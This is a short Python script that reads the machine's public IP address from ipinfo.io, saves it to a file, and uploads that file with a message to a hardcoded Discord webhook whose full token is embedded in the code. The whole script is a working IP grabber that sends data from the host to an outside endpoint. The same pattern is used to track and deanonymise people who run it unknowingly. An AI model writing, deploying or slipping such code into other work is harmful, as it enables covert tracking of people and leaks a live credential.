import requests
import os
import sys
from discord_webhook import DiscordWebhook

f = open("ip.txt", 'wb')
r = requests.get("https://ipinfo.io/ip", timeout=5)
f.write(r.content)

webhook = DiscordWebhook(url='https://discord.com/api/webhooks/925556143655358496/JfmGGNcQTpSo3ZrsjXfzfrTN6XoS8vBmLnjqECjOebHHiJ5ZEQh7K4js48sJ0D0pXgzY', username="Info", content=sys.argv[1])

with open("./ip.txt", "rb") as f:
    webhook.add_file(file=f.read(), filename='ip.txt')

response = webhook.execute()
